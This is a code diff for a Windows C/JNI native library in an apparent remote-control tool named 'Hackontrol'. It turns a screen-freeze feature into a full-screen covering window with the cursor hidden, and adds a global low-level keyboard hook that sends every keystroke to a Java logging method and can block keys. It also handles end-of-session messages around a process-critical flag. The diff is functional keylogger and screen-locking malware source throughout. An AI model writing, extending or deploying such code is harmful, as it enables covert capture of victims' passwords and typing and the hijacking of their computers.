@@ -1,15 +1,18 @@
-#include <khopanjava.h>
+#include <Windows.h>
 #include "exception.h"
 #include "Kernel.h"
 #include "instance.h"
+#include "window.h"
 
-#define CLASS_NAME L"IFreezerClass"
+#define CLASS_NAME L"ICoveringWindow"
 
-static BOOL globalInitialized;
-static HBITMAP globalBitmap;
+static JNIEnv* globalEnvironment;
+static jclass globalUserClass;
 static HWND globalWindow;
+static jmethodID globalLogMethod;
+static HBITMAP globalBitmap;
 
-static LRESULT CALLBACK freezerProcedure(HWND window, UINT message, WPARAM wparam, LPARAM lparam) {
+static LRESULT CALLBACK windowProcedure(HWND window, UINT message, WPARAM wparam, LPARAM lparam) {
 	switch(message) {
 	case WM_CLOSE:
 		DestroyWindow(window);
@@ -17,6 +20,16 @@ static LRESULT CALLBACK freezerProcedure(HWND window, UINT message, WPARAM wpara
 	case WM_DESTROY:
 		PostQuitMessage(0);
 		return 0;
+	case WM_SETCURSOR:
+		SetCursor(NULL);
+		return 0;
+	case WM_QUERYENDSESSION:
+		if(lparam != 0 && !(lparam & ENDSESSION_CRITICAL)) {
+			return TRUE;
+		}
+
+		Kernel_setProcessCritical(globalEnvironment, NULL, FALSE);
+		return TRUE;
 	case WM_PAINT:
 		if(!globalBitmap) {
 			break;
@@ -33,15 +46,21 @@ static LRESULT CALLBACK freezerProcedure(HWND window, UINT message, WPARAM wpara
 		DeleteDC(memoryContext);
 		EndPaint(window, &paintStruct);
 		return 0;
-	case WM_SETCURSOR:
-		SetCursor(NULL);
-		return 0;
 	}
 
 	return DefWindowProcW(window, message, wparam, lparam);
 }
 
-static DWORD WINAPI freezerThread(_In_ LPVOID parameter) {
+static LRESULT CALLBACK keyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
+	if(code != HC_ACTION) {
+		return CallNextHookEx(NULL, code, wparam, lparam);
+	}
+
+	PKBDLLHOOKSTRUCT keyboard = (PKBDLLHOOKSTRUCT) lparam;
+	return (*globalEnvironment)->CallStaticBooleanMethod(globalEnvironment, globalUserClass, globalLogMethod, (jint) wparam, (jint) keyboard->vkCode, (jint) keyboard->scanCode, (jint) keyboard->flags, (jint) keyboard->time) ? 1 : CallNextHookEx(NULL, code, wparam, lparam);
+}
+
+static DWORD WINAPI windowThread(_In_ LPVOID parameter) {
 	JavaVM* virtualMachine = (JavaVM*) parameter;
 
 	if(!virtualMachine) {
@@ -50,22 +69,35 @@ static DWORD WINAPI freezerThread(_In_ LPVOID parameter) {
 
 	JavaVMAttachArgs arguments = {0};
 	arguments.version = JNI_VERSION_21;
-	arguments.name = NULL;
-	arguments.group = NULL;
 	JNIEnv* environment = NULL;
 
 	if((*virtualMachine)->AttachCurrentThread(virtualMachine, (void**) &environment, &arguments) != JNI_OK) {
 		return 1;
 	}
 
+	globalEnvironment = environment;
+	jclass userClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/nativelibrary/User");
+	DWORD returnValue = 1;
+
+	if(!userClass) {
+		goto detachThread;
+	}
+
+	globalUserClass = userClass;
+	jmethodID logMethod = (*environment)->GetStaticMethodID(environment, userClass, "log", "(IIIII)Z");
+	
+	if(!logMethod) {
+		goto detachThread;
+	}
+
+	globalLogMethod = logMethod;
 	HINSTANCE instance = GetProgramInstance();
 	WNDCLASSW windowClass = {0};
 	windowClass.style = CS_VREDRAW | CS_HREDRAW;
-	windowClass.lpfnWndProc = freezerProcedure;
+	windowClass.lpfnWndProc = windowProcedure;
 	windowClass.hInstance = instance;
 	windowClass.hCursor = NULL;
 	windowClass.lpszClassName = CLASS_NAME;
-	DWORD returnValue = 1;
 
 	if(!RegisterClassW(&windowClass)) {
 		HackontrolThrowWin32Error(environment, L"RegisterClassW");
@@ -78,10 +110,16 @@ static DWORD WINAPI freezerThread(_In_ LPVOID parameter) {
 
 	if(!window) {
 		HackontrolThrowWin32Error(environment, L"CreateWindowExW");
-		goto detachThread;
+		goto unregisterWindowClass;
 	}
 
 	globalWindow = window;
+
+	if(!SetWindowsHookExW(WH_KEYBOARD_LL, keyLoggerProcedure, NULL, 0)) {
+		HackontrolThrowWin32Error(environment, L"SetWindowsHookExW");
+		goto unregisterWindowClass;
+	}
+
 	MSG message;
 
 	while(GetMessageW(&message, NULL, 0, 0)) {
@@ -89,12 +127,12 @@ static DWORD WINAPI freezerThread(_In_ LPVOID parameter) {
 		DispatchMessageW(&message);
 	}
 
+	returnValue = 0;
+unregisterWindowClass:
 	if(!UnregisterClassW(CLASS_NAME, instance)) {
 		HackontrolThrowWin32Error(environment, L"UnregisterClassW");
-		goto detachThread;
+		returnValue = 1;
 	}
-
-	returnValue = 0;
 detachThread:
 	if((*virtualMachine)->DetachCurrentThread(virtualMachine) != JNI_OK) {
 		SetLastError(ERROR_FUNCTION_FAILED);
@@ -163,23 +201,13 @@ deleteScreenContext:
 	return returnValue;
 }
 
-void Kernel_setFreeze(JNIEnv* const environment, const jclass class, const jboolean freeze) {
-	if(!globalInitialized) {
-		globalInitialized = TRUE;
-		JavaVM* virtualMachine;
-
-		if((*environment)->GetJavaVM(environment, &virtualMachine)) {
-			SetLastError(ERROR_FUNCTION_FAILED);
-			HackontrolThrowWin32Error(environment, L"JNIEnv::GetJavaVM");
-			return;
-		}
-
-		if(!CreateThread(NULL, 0, freezerThread, virtualMachine, 0, NULL)) {
-			HackontrolThrowWin32Error(environment, L"CreateThread");
-			return;
-		}
+void HackontrolInitializeWindow(JNIEnv* const environment, JavaVM* const virtualMachine) {
+	if(!CreateThread(NULL, 0, windowThread, virtualMachine, 0, NULL)) {
+		HackontrolThrowWin32Error(environment, L"CreateThread");
 	}
+}
 
+void Kernel_setFreeze(JNIEnv* const environment, const jclass class, const jboolean freeze) {
 	if(freeze && !captureScreen(environment)) {
 		return;
 	}
